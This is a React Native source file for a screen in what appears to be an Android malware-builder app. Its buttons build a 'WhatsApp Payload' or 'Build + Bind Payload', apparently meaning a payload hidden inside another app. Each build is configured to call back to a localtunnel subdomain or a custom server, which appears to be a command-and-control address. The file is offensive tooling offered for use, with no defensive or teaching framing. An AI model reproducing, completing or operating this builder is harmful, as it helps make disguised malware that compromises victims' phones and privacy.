import React, { useState } from "react";
import { PermissionsAndroid } from 'react-native';
import { 
    Box,
    StatusBar, 
    Icon,
    Button,
    useToast
} from "native-base";
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
// redux
import { useDispatch, useSelector } from '../../redux/store';
import { addBuildPayloadLogs } from '../../redux/slices/userInfo'

// components
import BuildLogScreen from '../../components/BuildLogScreen'

import AppBuilder from '../../native-modules/AppBuilder'
import CustomInput from "../../components/CustomInput";
import CustomInputBind from "../../components/CustomInputBind";

const PayloadOptions = ({navigation}) => {
  const [visible, setVisible]= useState(false);
  const [visible2, setVisible2]= useState(false);
  const [visible3, setVisible3]= useState(false);
  const dispatch = useDispatch();
  const toast = useToast();
  const { subdomain } = useSelector((state) => state.userInfo);

  const addlog =( type, message ) => { 
    dispatch(addBuildPayloadLogs({ type, message})) 
}
  
  const handleAppBuilder = async (isCustom)=>{
    const granted = await PermissionsAndroid.check( PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE );
     if (granted) {
      if(isCustom){
        setVisible3(true)
      }else{
        navigation.navigate('payloadBuilder',{url:`https://${subdomain}.loca.lt`})
       }
     }else{
      requestPermission();
     }
    
  }
  const handleBuilder=async(isCustom)=>{
    const granted = await PermissionsAndroid.check( PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE );
     if (granted) {
       if(isCustom){
        setVisible2(true)
      }else{
         setVisible(true)
         AppBuilder.buildPayload(`https://${subdomain}.loca.lt` ,addlog)
       }
     }else{
      requestPermission();
     }
  }

  async function requestPermission() 
   { 
     try {
          const granted = await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.WRITE_EXTERNAL_STORAGE)
          if (granted!== PermissionsAndroid.RESULTS.GRANTED) {
               toast.show({ title: "Permission not granted", status: "error",placement: "top",description: "Please grant permission"})
          } 
        } catch (err) { } 
   }
  
  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop bg={"primary"}/>

    <Box flex={1} justifyContent={"center"} bg={"primary"} px={'10'} >
    <Button variant={'subtle'} onPress={()=>handleBuilder(false)} colorScheme={'tertiary'} size={'lg'} borderRadius={16} mb={'10'} leftIcon={<Icon as={MaterialCommunityIcons} name="whatsapp" size="sm" />}>
     {'Build WhatsApp Payload (localtunnel)'}
    </Button>
    <Button variant={'subtle'} onPress={()=>handleBuilder(true)} colorScheme={'tertiary'} size={'lg'} borderRadius={16} mb={'10'} leftIcon={<Icon as={MaterialCommunityIcons} name="whatsapp" size="sm" />}>
     {'Build WhatsApp Payload (custom server)'}
    </Button>
    <Button onPress={()=>handleAppBuilder(false)} variant={'subtle'} mb={'10'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="hammer-wrench" size="sm" />}>
     {'Build + Bind Payload (localtunnel)'}
    </Button>
    <Button onPress={()=>handleAppBuilder(true)} variant={'subtle'} mb={'10'} colorScheme={'tertiary'} size={'lg'} borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="hammer-wrench" size="sm" />}>
     {'Build + Bind Payload (custom server)'}
    </Button>
    </Box>
    <CustomInput visible={visible2} setVisible={setVisible2} setVisibleLog={setVisible}/>
    <CustomInputBind visible={visible3} setVisible={setVisible3} navigation={navigation}/>
    <BuildLogScreen visible={visible} navigation={navigation}/>
    </>
    )
};

export default PayloadOptions;

  